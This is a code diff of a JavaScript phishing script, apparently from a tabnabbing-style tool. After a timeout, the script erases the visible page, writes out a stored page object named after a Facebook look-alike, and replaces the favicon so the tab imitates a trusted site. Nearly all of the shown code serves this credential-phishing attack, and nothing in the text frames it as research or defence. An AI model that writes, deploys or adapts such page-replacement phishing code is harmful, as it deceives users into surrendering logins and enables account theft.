@@ -12,12 +12,11 @@ function start_phishing_timeout() {
 }
 
 function start_phishing() {
-	//clear_page_contents();
-	build_page(webpage1);
-	//appendFavIcon('s');
+	clear_page_contents();
+	build_page(facebook_face_page1);
 }
 	
-// Deletes all the current page elements to make space for the new ones
+// Deletes all the current page elements
 function clear_page_contents() {
 	var all = document.getElementsByTagName("*");
 
@@ -30,33 +29,17 @@ function clear_page_contents() {
 	}
 }
 
+// Displays the page from the webpage object
 function build_page(webpage) {
-
-	/*var parser = new DOMParser(),
-	doc = parser.parseFromString(webpage.getSource, "text/xml");
-	console.log(webpage.getSource);
-	console.log(doc);*/
 	document.write(webpage.getSource);
 	document.close();
 }
 
-function appendFavIcon(webpage) {
+// Dynamically changes the favicon of the webpage
+function change_fav_icon(url) {
 	document.head = document.head || document.getElementsByTagName('head')[0];
-	
 	var link = document.createElement('link'),
-	oldLink = document.getElementById('dynamic-favicon');
-	link.id = 'dynamic-favicon';
 	link.rel = 'shortcut icon';
-	link.href = 'http://astrocamel.com/marketing-narrow_files/favico.ico';
-	if (oldLink) {
-		document.head.removeChild(oldLink);
-	}
+	link.href = url;
 	document.head.appendChild(link);
- 
-}
-
-function build_page_head() {
-}
-
-function build_page_body() {
 }
